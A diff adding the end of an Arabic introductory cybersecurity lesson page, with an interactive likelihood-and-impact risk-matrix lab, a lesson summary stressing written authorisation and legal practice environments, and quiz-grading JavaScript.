+    <p style="color:var(--text-light); font-size:0.95em;">عدّل الاحتمالية والأثر لكل ملاحظة (من 1 إلى 5)، أو أضف ملاحظتك، وشاهد ترتيب الأولويات ومكان كل ملاحظة على المصفوفة. المستويات مطابقة لدالة <code>level</code> في الدرس.</p>
+    <div id="rmRows" style="display:flex; flex-direction:column; gap:6px;"></div>
+    <div class="lab-row">
+        <input class="lab-input" id="rmNew" placeholder="ملاحظة جديدة، مثل: لوحة التحكم بلا 2FA" style="flex:1; min-width:200px;">
+        <button class="btn btn-primary" id="rmAdd" onclick="addRisk()">إضافة</button>
+    </div>
+    <div class="lab-row" style="align-items:flex-start;">
+        <div style="flex:1; min-width:230px;"><div class="lab-console" id="rmGrid" style="direction:ltr; text-align:center;"></div></div>
+        <div style="flex:1; min-width:230px;"><div class="lab-console" id="rmOut" style="direction:rtl; text-align:right;"></div></div>
+    </div>
+</div>
+</section>
+
+<section class="section-card" id="summary">
+        <h2 class="section-title">
+            <span class="num">9</span>
+            <i class="fas fa-flag-checkered"></i>
+            خلاصة الدرس
+        </h2>
+        <p>في هذا الدرس قمت بـ:</p>
+
+        <div class="note-box">
+            <strong>✅ ما تعلمته:</strong>
+            <ul>
+                <li><i class="fas fa-check"></i> ثالوث CIA: السرية والسلامة والتوافر، وأشهر التهديدات لكل منها.</li>
+                <li><i class="fas fa-check"></i> أدوار العاملين في الأمن السيبراني: الفريق الأزرق والأحمر وغيرهما.</li>
+                <li><i class="fas fa-check"></i> الأخلاقيات والقانون: التصريح المكتوب والنطاق والإفصاح المسؤول.</li>
+                <li><i class="fas fa-check"></i> بيئات التدريب القانونية، ولماذا بايثون أداة المحلل الأمني.</li>
+                <li><i class="fas fa-check"></i> مراقب سلامة الملفات ببصمات SHA-256 وخط الأساس.</li>
+                <li><i class="fas fa-check"></i> لماذا random خطرة على الأسرار، واستخدام secrets و compare_digest.</li>
+                <li><i class="fas fa-check"></i> مصفوفة المخاطر ومبادئ الدفاع الأساسية.</li>
+            </ul>
+        </div>
+
+        <div class="note-box">
+            <strong>💡 نصائح للممارسة:</strong>
+            <ul>
+                <li><i class="fas fa-lightbulb"></i> اسأل نفسك قبل أي اختبار: هل أملك تصريحًا مكتوبًا؟</li>
+                <li><i class="fas fa-lightbulb"></i> تدرّب فقط على أجهزتك وعلى بيئات التدريب القانونية.</li>
+                <li><i class="fas fa-lightbulb"></i> اقرأ أي أداة أمنية قبل تشغيلها.</li>
+                <li><i class="fas fa-lightbulb"></i> رتّب الإصلاحات حسب الخطر، لا حسب السهولة.</li>
+            </ul>
+        </div>
+
+        <div class="alert alert-tip">
+            <i class="fas fa-graduation-cap"></i>
+            <div>
+                <strong>الخطوة التالية:</strong> في الدرس القادم ستتعلم <strong>التجزئة والتشفير</strong>: تخزين كلمات المرور بأمان، و HMAC، والتشفير المتماثل وغير المتماثل والتوقيع الرقمي.
+            </div>
+        </div>
+
+        <div class="progress-section">
+            <h4><i class="fas fa-chart-line"></i> تقدمك في المسار</h4>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0% مكتمل</div>
+        </div>
+    </section>
+
+    <!-- التنقل -->
+    <div class="nav-links">
+        <a href="../index.html" class="nav-link prev">
+            <i class="fas fa-arrow-right"></i>
+            <span>الرجوع إلى صفحة تخصص الأمن السيبراني</span>
+        </a>
+        <a href="../index.html" class="nav-link next">
+            <span>صفحة التخصص (بقية الدروس قريبًا)</span>
+            <i class="fas fa-arrow-left"></i>
+        </a>
+    </div>
+
+</main>
+
+<footer>
+    © 2025 CodeWay — مسار Python · مدخل إلى الأمن
+</footer>
+
+<script>
+    /* ========== شريط التقدم ========== */
+    document.addEventListener('DOMContentLoaded', () => {
+        const fill = document.getElementById('progressFill');
+        const text = document.getElementById('progressText');
+        setTimeout(() => {
+            fill.style.width = '10%';
+            text.textContent = '10% مكتمل';
+        }, 400);
+    });
+
+    /* ========== أدوات مشتركة للتمارين ========== */
+    function showResult(qid, cls, html) {
+        const msg = document.getElementById(qid + '-result');
+        msg.classList.remove('ok', 'mid', 'bad');
+        msg.classList.add('show', cls);
+        msg.innerHTML = html;
+    }
+
+    function clearResult(qid) {
+        document.getElementById(qid + '-result').classList.remove('show', 'ok', 'mid', 'bad');
+    }
+
+    function grade(qid, right, total, extra) {
+        const box = document.getElementById(qid);
+        if (right === total && !extra) {
+            showResult(qid, 'ok', '<i class="fas fa-check-circle"></i> ' + box.dataset.ok + ' 🎉');
+        } else if (right > 0) {
+            showResult(qid, 'mid', `<i class="fas fa-info-circle"></i> أصبت في ${right} من ${total}. ` + box.dataset.hint);
+        } else {
+            showResult(qid, 'bad', '<i class="fas fa-times-circle"></i> ليست صحيحة. ' + box.dataset.hint);
+        }
+    }
+
+    /* ========== اختيار من متعدد ========== */
+    function checkMC(qid) {
+        const options = document.querySelectorAll('#' + qid + ' .option');
+        let right = 0, wrong = 0, total = 0, picked = 0;
+        options.forEach(opt => {
+            const input = opt.querySelector('input');
+            const isCorrect = opt.dataset.correct === '1';
+            if (isCorrect) total++;
+            opt.classList.remove('correct', 'wrong');
+            if (input.checked) {
+                picked++;
+                if (isCorrect) { opt.classList.add('correct'); right++; }
+                else { opt.classList.add('wrong'); wrong++; }
+            }
+        });
+        if (picked === 0) {
+            showResult(qid, 'mid', '<i class="fas fa-exclamation-circle"></i> اختر إجابة أولًا.');
+            return;
+        }
+        grade(qid, right, total, wrong > 0);
+    }
+
+    function resetMC(qid) {
+        document.querySelectorAll('#' + qid + ' .option').forEach(opt => {
+            opt.classList.remove('correct', 'wrong');
+            opt.querySelector('input').checked = false;
+        });
+        clearResult(qid);
+    }
+
+    /* ========== صح أم خطأ ========== */
+    function pickTF(btn, value) {
+        const item = btn.closest('.tf-item');
+        item.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected');
+        item.dataset.selected = value;
+    }
+
+    function checkTF(qid) {
+        const items = document.querySelectorAll('#' + qid + ' .tf-item');
+        let right = 0, answered = 0;
+        items.forEach(item => {
+            const correct = item.dataset.answer === 'true';
+            const selected = item.dataset.selected;
+            item.classList.remove('correct', 'wrong');
+            if (selected === undefined) return;
+            answered++;
+            if ((selected === 'true') === correct) { item.classList.add('correct'); right++; }
+            else { item.classList.add('wrong'); }
+        });
+        if (answered < items.length) {
+            showResult(qid, 'mid', `<i class="fas fa-exclamation-circle"></i> لم تجب على جميع العبارات (${answered}/${items.length}).`);
+            return;
+        }
+        grade(qid, right, items.length, false);
+    }
+
+    function resetTF(qid) {
+        document.querySelectorAll('#' + qid + ' .tf-item').forEach(item => {
+            item.classList.remove('correct', 'wrong');
+            delete item.dataset.selected;
+            item.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('selected'));
+        });
+        clearResult(qid);
+    }
+
+    /* ========== أكمل الفراغ / توقّع الناتج ========== */
+    function normalize(v) {
+        return v.trim().replace(/\s+/g, '').replace(/[“”"‘’]/g, "'");
+    }
+
+    function checkFill(qid) {
+        const inputs = document.querySelectorAll('#' + qid + ' .blank-input');
+        let right = 0;
+        inputs.forEach(inp => {
+            const answers = inp.dataset.answers.split('||').map(normalize);
+            inp.classList.remove('correct', 'wrong');
+            if (answers.includes(normalize(inp.value))) { inp.classList.add('correct'); right++; }
+            else { inp.classList.add('wrong'); }
+        });
+        grade(qid, right, inputs.length, false);
+    }
+
+    function resetFill(qid) {
+        document.querySelectorAll('#' + qid + ' .blank-input').forEach(inp => {
+            inp.value = '';
+            inp.classList.remove('correct', 'wrong');
+        });
+        clearResult(qid);
+    }
+
+    /* ========== ترتيب الكود ========== */
+    function moveItem(btn, direction) {
+        const item = btn.closest('.sortable-item');
+        const list = item.parentElement;
+        const items = Array.from(list.children);
+        const index = items.indexOf(item);
+        if (direction === -1 && index > 0) list.insertBefore(item, items[index - 1]);
+        else if (direction === 1 && index < items.length - 1) list.insertBefore(items[index + 1], item);
+        renumber(list);
+    }
+
+    function renumber(list) {
+        Array.from(list.children).forEach((item, i) => {
+            item.querySelector('.order-num').textContent = i + 1;
+            item.classList.remove('correct', 'wrong');
+        });
+    }
+
+    function checkSort(qid) {
+        const items = document.querySelectorAll('#' + qid + ' .sortable-item');
+        let right = 0;
+        items.forEach((item, index) => {
+            item.classList.remove('correct', 'wrong');
+            if (parseInt(item.dataset.correct) === index + 1) { item.classList.add('correct'); right++; }
+            else { item.classList.add('wrong'); }
+        });
+        grade(qid, right, items.length, false);
+    }
+
+    function resetSort(qid) {
+        const list = document.querySelector('#' + qid + ' .sortable-list');
+        Array.from(list.children)
+            .sort((a, b) => parseInt(a.dataset.orig) - parseInt(b.dataset.orig))
+            .forEach(item => list.appendChild(item));
+        renumber(list);
+        clearResult(qid);
+    }
+
+    /* ========== أدوات المختبر: تمثيل القيم بأسلوب Python ========== */
+    function pyRepr(v) {
+        if (v === null || v === undefined) return 'None';
+        if (v === true) return 'True';
+        if (v === false) return 'False';
+        if (typeof v === 'string') return "'" + v.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + "'";
+        if (typeof v === 'number') return Number.isInteger(v) && v.__float ? v + '.0' : String(v);
+        if (v instanceof PyFloat) return Number.isInteger(v.value) ? v.value + '.0' : String(v.value);
+        if (v instanceof PyTuple) return v.items.length === 1 ? '(' + pyRepr(v.items[0]) + ',)' : '(' + v.items.map(pyRepr).join(', ') + ')';
+        if (v instanceof PySet) return v.items.length ? '{' + v.items.map(pyRepr).join(', ') + '}' : 'set()';
+        if (Array.isArray(v)) return '[' + v.map(pyRepr).join(', ') + ']';
+        if (v instanceof Map) return '{' + Array.from(v.entries()).map(([k, val]) => pyRepr(k) + ': ' + pyRepr(val)).join(', ') + '}';
+        return String(v);
+    }
+    function PyTuple(items) { this.items = items; }
+    function PySet(items) { this.items = items; }
+    function PyFloat(value) { this.value = value; }
+
+    /* يحوّل نصًا كتبه المستخدم إلى قيمة: رقم أو نص أو True/False/None */
+    function parseLiteral(raw) {
+        const s = raw.trim();
+        if (/^-?\d+$/.test(s)) return parseInt(s, 10);
+        if (/^-?\d*\.\d+$/.test(s)) return new PyFloat(parseFloat(s));
+        if (s === 'True') return true;
+        if (s === 'False') return false;
+        if (s === 'None') return null;
+        const q = s.match(/^(['"])(.*)\1$/);
+        return q ? q[2] : s;
+    }
+
+    function keyOf(v) { return v instanceof PyFloat ? 'f' + v.value : typeof v + ':' + String(v); }
+
+    function consoleLine(el, code, result, isErr) {
+        const line = document.createElement('div');
+        line.innerHTML = '<span class="prompt">&gt;&gt;&gt; </span>' + escapeHtml(code) +
+            (result === undefined ? '' : '\n' + (isErr ? '<span class="err">' + escapeHtml(result) + '</span>' : escapeHtml(result)));
+        el.appendChild(line);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function escapeHtml(s) {
+        return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+    }
+
+    /* ========== مختبر مصفوفة المخاطر ========== */
+    const RISKS = [
+        ['صفحة الدخول بلا حد لعدد المحاولات', 4, 4], ['كلمات المرور مخزنة بـ MD5 بلا ملح', 3, 5],
+        ['مكتبة قديمة فيها ثغرة معروفة', 3, 4], ['رسائل الخطأ تعرض مسارات الخادم', 3, 2],
+        ['لا نسخ احتياطية خارج الخادم', 2, 5],
+    ];
+    const riskLevel = s => s >= 15 ? ['حرج', '#e74c3c'] : s >= 8 ? ['مرتفع', '#e67e22'] : s >= 4 ? ['متوسط', '#f1c40f'] : ['منخفض', '#2ecc71'];
+
+    function renderRiskRows() {
+        const box = document.getElementById('rmRows');
+        box.innerHTML = RISKS.map(([t, l, i], k) => `
+            <div class="lab-row" style="margin:0;">
+                <span style="flex:1; min-width:160px;">${escapeHtml(t)}</span>
+                <label>الاحتمالية <input class="lab-input" type="number" min="1" max="5" value="${l}" style="width:60px;" oninput="setRisk(${k},1,this.value)"></label>
+                <label>الأثر <input class="lab-input" type="number" min="1" max="5" value="${i}" style="width:60px;" oninput="setRisk(${k},2,this.value)"></label>
+            </div>`).join('');
+    }
+
+    function setRisk(k, field, value) {
+        const v = Math.min(5, Math.max(1, parseInt(value, 10) || 1));
+        RISKS[k][field] = v;
+        runRisk();
+    }
+
+    function addRisk() {
+        const input = document.getElementById('rmNew');
+        const text = input.value.trim();
+        if (!text) return;
+        RISKS.push([text, 3, 3]);
+        input.value = '';
+        renderRiskRows();
+        runRisk();
+    }
+
+    function runRisk() {
+        const ranked = RISKS.map(([t, l, i]) => [t, l, i, l * i]).sort((a, b) => b[3] - a[3]);
+        document.getElementById('rmOut').innerHTML = ranked.map(([t, l, i, s], n) => {
+            const [name, color] = riskLevel(s);
+            return `<span style="color:${color}">${String(s).padStart(2)} ${name}</span>  ${escapeHtml(t)}`;
+        }).join('\n') + (ranked.length ? `\n\n<strong>ابدأ بـ:</strong> ${escapeHtml(ranked[0][0])}` : '');
+        const rows = [];
+        for (let imp = 5; imp >= 1; imp--) {
+            let row = `${imp} │`;
+            for (let lik = 1; lik <= 5; lik++) {
+                const count = RISKS.filter(r => r[1] === lik && r[2] === imp).length;
+                const color = riskLevel(lik * imp)[1];
+                row += `<span style="display:inline-block; width:2.2em; background:${color}33; border:1px solid ${color}66; margin:1px;">${count || '·'}</span>`;
+            }
+            rows.push(row);
+        }
+        document.getElementById('rmGrid').innerHTML = 'الأثر ↑\n' + rows.join('\n') + '\n    1    2    3    4    5\n      الاحتمالية →';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => { renderRiskRows(); runRisk(); });
+
+    /* ========== ظهور ناعم ========== */
+    document.addEventListener('DOMContentLoaded', () => {
+        const obs = new IntersectionObserver((entries) => {
+            entries.forEach(e => {
+                if (e.isIntersecting) {
+                    e.target.style.opacity = '1';
+                    e.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section-card, .toc-bar').forEach(el => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateY(20px)';
+            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            obs.observe(el);
+        });
+    });
+</script>
+
+</body>
+</html>
